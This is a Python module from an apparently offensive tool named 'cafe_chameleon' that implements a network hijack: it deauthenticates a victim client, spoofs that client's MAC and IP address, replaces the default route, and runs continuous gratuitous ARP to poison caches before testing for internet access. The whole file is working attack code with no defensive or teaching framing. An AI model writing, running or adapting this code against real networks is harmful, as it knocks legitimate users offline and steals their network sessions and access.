"""
cafe_chameleon.network.hijack.impersonate - Network host impersonation procedure.
"""

import re
import time

from cafe_chameleon.utils.signals import HijackSkipInterrupt
from cafe_chameleon.utils.process import _run
from cafe_chameleon.utils.tracing import trace
from cafe_chameleon.ui.console import log_hijack, set_hijack_status
from cafe_chameleon.network.sysfs import wait_for_carrier, get_carrier_status
from cafe_chameleon.network.nmcli import get_active_profile
from cafe_chameleon.network.mac import set_mac_address
from cafe_chameleon.network.arp import send_gratuitous_arp, start_background_garp
from cafe_chameleon.network.deauth import send_deauth
from cafe_chameleon.network.internet import has_internet, test_internet_speed


def hijack(interface: str, ip: str, mac: str, netmask: str, broadcast: str, gateway: str, max_retries: int = 2, timeout_per_retry: float = 4, profile: str | None = None, bssid: str | None = None, channel: int | None = None) -> bool:
    """
    High-reliability network connection procedure with streamlined status reporting.
    """
    trace(f"[FEATURE] Initiating host impersonation/hijack on interface {interface} targeting {ip} ({mac})")
    set_hijack_status(ip=ip, technique="Host Impersonation Sweep", clear_section2=True)
    log_hijack("[*] Spoofing MAC address and configuring network adapter...")
    active_profile = profile or get_active_profile()

    try:
        send_deauth(mac, bssid, interface, channel=channel)

        for attempt in range(1, max_retries + 1):
            set_hijack_status(ip=ip, technique="Host Impersonation Sweep", clear_section2=True)
            log_hijack(f"[*] Configuring interface MAC & IP address (Attempt {attempt}/{max_retries})...")
            mac_ok = set_mac_address(interface, mac, profile=active_profile)
            if not mac_ok:
                trace(f"[-] MAC spoof failed -> {mac}")

            log_hijack("[*] Synchronizing adapter link carrier...")
            carrier_ok = wait_for_carrier(interface, timeout=5.0, poll_interval=0.05)
            if not carrier_ok:
                trace(f"[-] Carrier down on {interface}, recovering...")
                _run(f"ip link set dev {interface} up", debug=False)
                if active_profile:
                    _run(["nmcli", "device", "wifi", "rescan"], debug=False)
                    _run(["nmcli", "connection", "up", active_profile], debug=False, timeout=15.0)
                carrier_ok = wait_for_carrier(interface, timeout=3.0, poll_interval=0.05)

            _run(f"ip addr flush dev {interface} scope global")
            rc_ip, ip_err = _run(f"ip -4 addr add {ip}/{netmask} broadcast {broadcast} dev {interface}")

            try:
                _run(f"ip route flush dev {interface}")
                if gateway:
                    rc_rt, rt_err = _run(f"ip route replace default via {gateway} dev {interface} onlink")
            except Exception as e:
                trace(f"[-] Route error: {e}")

            garp_stop_event = None
            if gateway:
                log_hijack("[*] Broadcasting gratuitous ARP packets to update ARP caches...")
                send_gratuitous_arp(interface, ip, gateway)
                garp_stop_event = start_background_garp(interface, ip, gateway)

            try:
                start_time = time.time()
                verified = False
                last_mac_ok, last_ip_ok, last_conn_ok = False, False, False

                while time.time() - start_time < timeout_per_retry:
                    current_mac = None
                    try:
                        with open(f"/sys/class/net/{interface}/address", "r") as f:
                            current_mac = f.read().strip().lower()
                    except Exception:
                        rc, mac_out = _run(f"macchanger -s {interface}", debug=False)
                        m = re.search(r"Current MAC:\s+([0-9a-fa-f:]+)", mac_out, re.IGNORECASE)
                        if m:
                            current_mac = m.group(1).lower()
                    last_mac_ok = (current_mac == mac.lower()) if current_mac else False

                    rc, if_out = _run(f"ip addr show dev {interface}", debug=False)
                    last_ip_ok = (f"inet {ip}/" in if_out) or (f"inet {ip} " in if_out)
                    last_conn_ok = get_carrier_status(interface)

                    if last_mac_ok and last_ip_ok and last_conn_ok:
                        verified = True
                        break

                    time.sleep(0.2)

                if not verified:
                    trace(f"[-] Interface verify failed ({attempt}/{max_retries}) [MAC:{last_mac_ok} IP:{last_ip_ok} LINK:{last_conn_ok}]")
                else:
                    log_hijack("[*] Verifying internet connectivity...")
                    has_base = has_internet(timeout=1.0, check_speed=False)
                    if not has_base:
                        log_hijack("\033[91m[-] Target unreachable (Gateway/DNS failed)\033[0m")
                        return False

                    is_fast, speed_val = test_internet_speed(timeout=1.5, min_speed_kbps=5.0)
                    if is_fast:
                        log_hijack(f"\033[92m[+] SUCCESS! Internet active [{speed_val:.1f} KB/s]\033[0m")
                        return True
                    else:
                        speed_desc = f"{speed_val:.1f} KB/s" if speed_val > 0 else "0 KB/s"
                        log_hijack(f"\033[91m[-] Connection slow or throttled ({speed_desc})\033[0m")
                        return False
            finally:
                if garp_stop_event:
                    garp_stop_event.set()

            if attempt < max_retries:
                time.sleep(0.5)
    except HijackSkipInterrupt:
        log_hijack("\033[93m[-] Skipped target\033[0m")
        return False

    log_hijack("\033[91m[-] Host impersonation failed\033[0m")
    return False
